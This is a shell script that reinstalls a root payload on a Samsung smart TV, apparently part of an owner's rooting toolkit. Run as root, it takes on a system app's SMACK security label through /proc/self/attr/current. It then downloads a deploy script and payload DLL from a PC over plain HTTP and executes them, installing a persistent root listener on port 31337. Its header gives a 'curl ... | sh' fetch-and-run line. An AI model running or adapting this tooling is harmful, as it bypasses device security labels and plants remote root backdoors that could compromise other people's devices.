#!/bin/sh
# recover.sh - reinstall the root payload on a TV whose payload was removed.
#
# Run this FROM A ROOT SHELL ON THE TV, not on the PC. Get that shell with
# `python tools/tv_rootwatch.py` (it sends op 5 and leaves a shell on
# 127.0.0.1:9999), then paste:
#
#     curl -s http://<pc-ip>/recover.sh | sh
#
# Why a script: the app's bin/ is only writable while the process carries the
# app's own SMACK label, and a root shell can take that label directly by writing
# /proc/self/attr/current (works with root + full caps). The app directory is
# `User::Home` transmute=TRUE, so the files we create while carrying that label
# inherit it and the app can read them.
#
# Then deploy.sh disables the AOT and installs the payload; it restarts the app
# so the new DLL loads and the payload roots itself and listens on 31337
# (~40 s after any boot, with no PC involved).
#
# The host is an explicit argument (preferred) or the address the last deploy
# recorded on the TV.  It is validated as IPv4: the payload's allowlist compares
# peer IPs, so a hostname or a stray "https://" would install a channel that
# refuses the PC (review finding H3, 2026-10-26).  The deploy script is fetched
# from that same host; server.py renders its H=/WANT= markers, and a plain static
# server is handled by rewriting H= here.
H="${1:-}"
if [ -z "$H" ] && [ -f /opt/usr/home/owner/share/rootchan.host ]; then
  host=$(head -n1 /opt/usr/home/owner/share/rootchan.host 2>/dev/null)
  [ -n "$host" ] && H="$host"
fi
if [ -z "$H" ]; then
  echo "RECOVER=fail - pass the PC address: sh recover.sh http://<pc-ip>"
  exit 1
fi
case "$H" in
  *://*) H=${H#*://} ;;
esac
H=${H%/}
case "$H" in
  *[!0-9.]*|.*|*.)
    echo "RECOVER=fail (host '$H' is not an IPv4 address; the 31337 allowlist compares IPs)"
    exit 1 ;;
esac
H="http://$H"
APPID=com.samsung.tv.MultiControl-Service
LABEL="User::Pkg::$APPID"

echo "uid=$(id -u)"
if [ "$(id -u)" != "0" ]; then
  echo "RECOVER=fail (need root; run tools/tv_rootwatch.py first)"
  exit 1
fi

printf %s "$LABEL" > /proc/self/attr/current
if [ "$(cat /proc/self/attr/current)" != "$LABEL" ]; then
  echo "RELABEL=fail"
  exit 1
fi
echo "RELABEL=ok ($LABEL)"

# the app must be running for its label to be meaningful, and so that
# deploy.sh can find the payload pid to kill (AUL then relaunches it)
aulctl is-active "$APPID" 2>/dev/null

TMPD=$(mktemp -d "${TMPDIR:-/tmp}/dsh_recover.XXXXXX" 2>/dev/null) || TMPD=""
if [ -z "$TMPD" ]; then TMPD="/tmp/.dsh_recover.$$"; mkdir -p "$TMPD" || exit 1; fi
SCRIPT_FILE="$TMPD/deploy.sh"

if ! curl -fsS -o "$SCRIPT_FILE" "$H/deploy.sh"; then
  echo "RECOVER=fail (cannot fetch $H/deploy.sh - is the PC server up and serving by IP?)"
  exit 1
fi
if grep -q '@WANT@\|@HOST@\|@SIZE@' "$SCRIPT_FILE"; then
  # A plain static server served the template unrendered.  Rewrite ALL THREE
  # markers from the payload that server actually serves: rewriting H= alone
  # left @WANT@ in place, so deploy.sh exited NEED_RENDER (review 2026-10-26).
  if ! curl -fsS -o "$TMPD/payload.dll" "$H/payload.dll"; then
    echo "RECOVER=fail (server did not render deploy.sh and payload.dll is not fetchable)"
    rm -rf "$TMPD" 2>/dev/null
    exit 1
  fi
  want=$(md5sum "$TMPD/payload.dll" | cut -d' ' -f1)
  size=$(wc -c < "$TMPD/payload.dll" | tr -d ' ')
  sed -e "s|^H=.*|H=http://${H#http://}|" \
      -e "s|^WANT=.*|WANT=$want|" \
      -e "s|^SIZE_WANT=.*|SIZE_WANT=$size|" "$SCRIPT_FILE" > "$TMPD/deploy.rendered" &&
    SCRIPT_FILE="$TMPD/deploy.rendered"
  echo "RECOVER=deploy.sh (markers rewritten locally from payload.dll: $size B, $want)"
else
  echo "RECOVER=deploy.sh (rendered by server.py)"
fi
if grep -q '@WANT@\|@HOST@\|@SIZE@' "$SCRIPT_FILE"; then
  echo "RECOVER=fail (template markers still present after the local rewrite)"
  rm -rf "$TMPD" 2>/dev/null
  exit 1
fi
echo "SCRIPT_MD5=$(md5sum "$SCRIPT_FILE" | cut -d' ' -f1)"

sh "$SCRIPT_FILE" > "$TMPD/deploy.out" 2>&1
STATUS=$?
cat "$TMPD/deploy.out"
if [ "$STATUS" -ne 0 ] || ! grep -q DEPLOY_DONE "$TMPD/deploy.out"; then
  echo "RECOVER=fail (deploy failed; see above)"
  rm -rf "$TMPD" 2>/dev/null
  exit 1
fi
rm -rf "$TMPD" 2>/dev/null
echo "RECOVER_DONE"
echo "verify from the PC:  python tools/root_shell.py \"id\" <tv-ip>"
